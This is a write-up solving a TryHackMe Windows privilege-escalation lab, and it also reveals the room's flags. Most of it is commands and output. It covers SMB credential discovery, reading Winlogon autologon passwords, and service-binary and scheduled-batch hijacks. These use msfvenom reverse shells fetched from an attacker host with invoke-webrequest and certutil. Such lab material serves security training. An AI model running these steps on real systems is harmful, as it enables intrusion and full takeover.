# [TryHackMe | Windows Jump](https://tryhackme.com/room/windowsjump) Challenge Room Solution Writeup

### What are the contents of flag1.txt?

Begin by scanning TARGET_IP with `nmap`.

```bash
root@ip-ATTACKER_IP:~# nmap -sV TARGET_IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 
Nmap scan report for ip-TARGET_IP.ec2.internal (TARGET_IP)
Host is up (0.00033s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.12 seconds
```

There is an open `SMB` server, attempt to list the shares via a null (or Guest) session.

```bash
root@ip-ATTACKER_IP:~# smbclient -L //TARGET_IP/ -U ""
Password for [WORKGROUP\]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Public          Disk      Public file share
SMB1 disabled -- no workgroup available
```

Attempt to access the `public` share, then find and get the `welcome.txt` file.

```bash
root@ip-ATTACKER_IP:~# smbclient //TARGET_IP/Public -U ""
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon May 11 06:40:51 2026
  ..                                  D        0  Mon May 11 06:40:51 2026
  welcome.txt                         A      177  Mon May 11 06:40:50 2026

		7863807 blocks of size 4096. 3610680 blocks available
smb: \> get welcome.txt 
getting file \welcome.txt of size 177 as welcome.txt (86.4 KiloBytes/sec) (average 86.4 KiloBytes/sec)
```

Examine its contents.

```bash
root@ip-ATTACKER_IP:~# cat welcome.txt 
Welcome to CORP-NET.

New employee default credentials
================================
Username : thmuser
Password : Password1!

Please change your password after first login.
```

It appears that the employee default credentials may be used to log in.

```bash
root@ip-ATTACKER_IP:~# xfreerdp /v:TARGET_IP /u:thmuser /p:'Password1!' /dynamic-resolution
```

Open `powershell.exe` and confirm successfull escalation to `thmuser`.

```bash
PS C:\Users\thmuser.PRIVESC> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== ============================================
privesc\thmuser S-1-5-21-1966530601-3185510712-10604624-1008


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Users\thmuser.PRIVESC> get-content (get-childitem -path C:\ -filter flag1.txt -recurse -erroraction silentlycontinue | select-object -first 1).fullname
THM{5mb_cr3d5_1n_th3_5h4r3}
```

Retrieve the `thmuser` flag **THM{5mb_cr3d5_1n_th3_5h4r3}**.

### What are the contents of flag2.txt?

Check the system for other users.

```bash
PS C:\Users\thmuser.PRIVESC> get-localuser

Name               Enabled Description
----               ------- -----------
Administrator      True    Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
Guest              True    Built-in account for guest access to the computer/domain
notadmin           True
svcadmin           True
thmuser            True
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scenarios.
```

Check for automatic authentication credentials stored in `Winlogon`.

```bash
PS C:\Users\thmuser.PRIVESC> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x42f622f30
    ShutdownFlags    REG_DWORD    0x80000027
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    notadmin
    DefaultPassword    REG_SZ    P@ssw0rd!
    AutoLogonSID    REG_SZ    S-1-5-21-1966530601-3185510712-10604624-1009
    LastUsedUsername    REG_SZ    notadmin

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```

Use `username=notadmin` and `password=P@ssw0rd!` to escalate privileges.

```bash
PS C:\Users\thmuser.PRIVESC> runas /user:PRIVSEC\notadmin powershell.exe
Enter the password for PRIVSEC\notadmin:
Attempting to start powershell.exe as user "PRIVSEC\notadmin" ...
```

Confirm successfull escalation from `thmuser` to `notadmin`.

```bash
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ============================================
privesc\notadmin S-1-5-21-1966530601-3185510712-10604624-1009


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Windows\system32> get-content (get-childitem -path C:\ -filter flag2.txt -recurse -erroraction silentlycontinue | select-object -first 1).fullName
THM{w1nl0g0n_cr3ds_3xp0s3d}
```

Retrieve the `notadmin` flag **THM{w1nl0g0n_cr3ds_3xp0s3d}**.

### What are the contents of flag3.txt?

Search for services related to the `svcadmin` user. 

```bash
PS C:\Windows\system32> wmic service get name,pathname,startname | findstr /i "svcadmin"
THMSvc      C:\Windows\THMSVC\svc.exe       .\svcadmin
```

Check permissions for this directory.

```bash
PS C:\Windows\system32> icacls C:\Windows\THMSVC\
C:\Windows\THMSVC\ PRIVESC\notadmin:(OI)(CI)(F)
                   BUILTIN\Administrators:(OI)(CI)(F)
                   NT AUTHORITY\SYSTEM:(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

`notadmin` has Object Inherit (OI), Container Inherit (CI), and Full Control (F) for the directory and all contents. `svc.exe` can therefore be replaced by `notadmin` and run. 

Start a listener with `nc`. 

```bash
root@ip-ATTACKER_IP:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
```

Create and host a reverse shell.

```bash 
root@ip-ATTACKER_IP:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o svc.exe  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 5632 bytes
Saved as: svc.exe
root@ip-ATTACKER_IP:~# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Retrieve it as `notadmin` to replace the existing `svc.exe`, then start it.

```bash
PS C:\Windows\system32> invoke-webrequest -uri 'http://ATTACKER_IP:8080/svc.exe' -OutFile 'C:\Windows\THMSVC\svc.exe'
PS C:\Windows\system32> sc.exe start THMSvc

SERVICE_NAME: THMSvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1156
        FLAGS              :
```

Confirm successfull escalation from `notadmin` to `svcadmin`.

```bash
Connection received on TARGET_IP 51001
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell.exe
powershell.exe
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami /all
whoami /all

USER INFORMATION
----------------

User Name        SID                                         
================ ============================================
privesc\svcadmin S-1-5-21-1966530601-3185510712-10604624-1010


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Windows\system32> get-content (get-childitem -path C:\ -filter flag3.txt -recurse -erroraction silentlycontinue | select-object -first 1).fullName
THM{s3rv1c3_b1n4ry_h1j4ck3d}
```

Retrieve the `svcadmin` flag **THM{s3rv1c3_b1n4ry_h1j4ck3d}**.

### What are the contents of flag4.txt?

```bash
PS C:\Windows\system32> icacls C:\Windows\Tasks\cleanup.bat
icacls C:\Windows\Tasks\cleanup.bat
C:\Windows\Tasks\cleanup.bat BUILTIN\Users:(I)(RX)
                             PRIVESC\svcadmin:(I)(M)
                             BUILTIN\Administrators:(I)(F)
                             NT AUTHORITY\SYSTEM:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```

`svcadmin` has Read/Execute (I) and Modify (M) for this file.

Start a listener with `nc`. 

```bash
root@ip-ATTACKER_IP:~# nc -lvnp 4445
Listening on 0.0.0.0 4445
```

Create and host a reverse shell.

```bash
root@ip-ATTACKER_IP:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
root@ip-ATTACKER_IP:~# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Retrieve it as `svcadmin`, inject a call from `cleanup.bat`, then wait for it to run.


```bash
PS C:\Windows\system32> certutil -urlcache -f http://ATTACKER_IP:8080/shell.exe C:\Windows\Tasks\shell.exe
certutil -urlcache -f http://ATTACKER_IP:8080/shell.exe C:\Windows\Tasks\shell.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Windows\system32> echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat
echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat
```

Confirm successfull escalation from `svcadmin` to `nt authority\system`.

```bash
Connection received on TARGET_IP 49831
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell.exe
powershell.exe
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami /all
whoami /all

USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                           Attributes                                        
====================================== ================ ============================================================= ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                    
Everyone                               Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group
NT SERVICE\Schedule                    Well-known group S-1-5-80-4125092361-1567024937-842823819-2091237918-836075745 Enabled by default, Enabled group, Group owner    
LOCAL                                  Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                 Alias            S-1-5-32-544                                                  Enabled by default, Enabled group, Group owner    


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 

PS C:\Windows\system32> get-content (get-childitem -path C:\ -filter flag4.txt -recurse -erroraction silentlycontinue | select-object -first 1).fullName
get-content (get-childitem -path C:\ -filter flag4.txt -recurse -erroraction silentlycontinue | select-object -first 1).fullName
THM{t4sk_wr1t3_t0_SYST3M}
```

Retrieve the `nt authority\system` flag **THM{t4sk_wr1t3_t0_SYST3M}**.